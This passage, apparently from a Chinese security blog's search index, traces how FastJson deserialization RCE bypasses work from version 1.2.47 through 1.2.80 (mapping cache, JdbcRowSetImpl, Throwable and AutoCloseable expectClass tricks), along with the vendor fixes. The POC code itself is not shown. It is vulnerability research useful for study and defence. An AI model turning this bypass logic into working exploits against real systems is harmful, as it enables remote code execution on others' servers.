com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings 将常用的类通过 loadClass()放到 mappings中： 使用 POC进行调试： 继续跟进到 checkAutoType()中，代码使用 Mapping 和使用 deserializers.findClass() 查找 Java.lang.Class： 找到后赋值给 clazz： clazz有值后，直接返回了，无需经过黑白名单检测： 从 checkAutoType()出来后，跟进 deserialize()： Parser.parse()获取到 objVal的值： 进而赋值给 strVal: 经过一系列 if判断，因为 clazz 为 java.lang.Class &#x3D;&#x3D; Class.class，所以 strVal作为参数被 TypeUtils.loadClass()调用，跟进 TypeUtils.loadClass()： 继续跟进 loadClass()，可以看到 cache参数默认为 true： 将 com.sun.rowset.JdbcRowSetImpl类加入到了 mapping中。这样在解析第二组键值对时，可以在 mapping中找到 JdbcRowSetImpl类从而直接 return class，无需黑白名单检测，实现RCE。 FastJson 1.2.48针对 1.2.47进行了修复，将 cache的默认值从 true修改为了 false： FastJson 1.2.62前提：autoTypeSupport 为 true POC FastJson 1.2.66前提：autoTypeSupport 为 true POC FastJson 1.2.68FastJson 1.2.68版本引入了安全模式 safeMode，如果开启了安全模式，直接抛出异常，一劳永逸： 这个版本有两个RCE： ThrowableDeserializer.deserialze() 和 JavaBeanDeserializer.deserialze() 但是 ThrowableDeserializer.deserialze() 很鸡肋，因为很少有开发往异常类中去写命令执行。 POC1 (Throwable) 调试 获取 Java.lang.Exception的反序列化器时，跟进 getDeserializer()方法： 因为 Throwable是 Exception类的父类，故使用 ThrowableDeserializer来获取反序列化器，而不是使用 createJavaBeanDeserializer()： 继续跟进 deserializer.deserialze()： 可以看到此时 checkAutoType()中的 exClassName值为 Throwable.class，跟进 checkAutoType()： 符合 expectClass.isAssignableFrom(clazz)的条件，return clazz，通过 checkAutoType检测，后续通过调用 getter，setter方法引发RCE。 POC2 (AutoCloseable) 过程同理，不过多赘述。 FastJson 1.2.80回顾 FastJson 1.2.68版本的漏洞，利用 ThrowableDeserializer和 JavaBeanDeserializer在调用 checkAutoType时第二个参数 exceptClass期望类不为空实现RCE，但是哪个开发往异常类里写命令执行函数呢，所以这个版本漏洞的攻击面很小，所以官网并未对这个绕过进行修复，而是把几个可能被利用的类加入了黑名单，为 FastJson 1.2.80版本的RCE埋下伏笔。 参考 Y4er师傅的代码，构造一个 Json解释原理： Json_poc: 打断点调试，同 FastJson_1.2.68，使用反序列化器 ThrowableDeserializer，跟进 ThrowableDeserializer.deserialze()： 依旧同 FastJson_1.2.68，获取第二个 @type中的值 com.xxxx.fastjson_demo.run.MyException，并创建它的异常实例： 继续跟进，若还有剩余键值对未进行反序列化 (这里剩余 “clazz”:{})，会继续获取 exClass的反序列化器： 继续跟进，如果 value不是 fieldInfo.fieldClass类型则会进入 TypeUtils.cast()中，这里 fieldInfo.fieldClass 是 com.xxxx.fastjson_demo.run.MyException，value &#x3D; {}显然类型不同，跟进 TypeUtils.cast()： 继续跟进： 经过一系列判断，因为 obj &#x3D; value &#x3D; {}，{}表示空的 JSON对象，{} instancef Map是正确的，继续跟进 castToJavaBean()： 跟进 getDeserializer()方法： 继续跟进： 最后调用 putDeserializer()方法，将 com.xxxx.fastjson_demo.run.MyClass类加入到 deserializer名单中 这样就可以在反序列化 Json中的 “b”的内容时，通过 checkAutoType检测，实现RCE。 POC(1) Groovy: (参考 ) 修复：直接干掉了异常类 参考文章：(1)  (2)  (3)  (4)  (5) "},{"title":"FastJson漏洞POC的构造逻辑","date":"2025-01-11T13:12:50.815Z","url":"/2025/01/11/FastJson%E6%BC%8F%E6%B4%9E%20POC%E7%9A%84%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"FastJson的调用逻辑 (根据代码执行结果分析)Fastjson漏洞产生在将 JSON字符串 反序列化为 JavaBean的过程中。 这是一段使用 parseObject()方法将 JSON字符串反序列化的代码： User类： JSONUser类： 可以看到 JSON字符串中的 “studentName” : “admin”，而不是 “name” : “admin”，是因为要向 setStudentName看齐： “studentName” 运行结果 -&gt; setStudentName()方法被调用 “name” 运行结果 -&gt; setStudentName()方法未被调用 这个例子也就解释了为什么 Fastjson 1.2.24 - JdbcRowSetImpl链 POC中 需要给 autoCommit参数单独赋值(true和 false都行)，原因就是不赋值调用不了 setAutoCommit方法。"}]